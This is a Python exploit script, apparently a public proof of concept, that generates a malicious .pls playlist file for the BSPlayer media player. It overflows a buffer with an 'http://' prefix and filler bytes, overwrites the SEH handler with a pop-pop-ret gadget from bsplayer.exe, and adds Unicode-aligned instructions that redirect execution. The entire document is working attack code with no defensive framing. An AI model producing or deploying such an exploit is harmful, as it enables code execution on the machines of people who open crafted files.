#!/usr/bin/python

import struct

file = "lagu-random4.pls"
buf = "\x68\x74\x74\x70\x3a\x2f\x2f"	# http:// 
buf += "\x41" * 4102
nseh = "\x61\x62"	# popad 
seh = "\x25\x4f"	# 0x004f0025 # pop ecx # pop ebp # ret from bsplayer.exe

prepare = "B"
prepare += "\x6e"	# nop/align
prepare += "\x55"	# push ebp
prepare += "\x6e"	# nop/align
prepare += "\x58"	# pop eax
prepare += "\x6e"	# nop/align
prepare += "\x05\x14\x11"	# add eax, 0x11001400
prepare += "\x6e"	# nop/align
prepare += "\x2d\x13\x11"	# sub eax, 0x11001300
prepare += "\x6e"	# nop/align

jump = "\x50"		# push eax
jump += "\x6e"		# nop/align
jump += "\xc3"		# ret

junk = "B" * (5000 - len(buf+nseh+seh+prepare+jump))
sploit = buf+nseh+seh+prepare+jump+junk
f = open(file, 'w')
f.write(sploit)
f.close()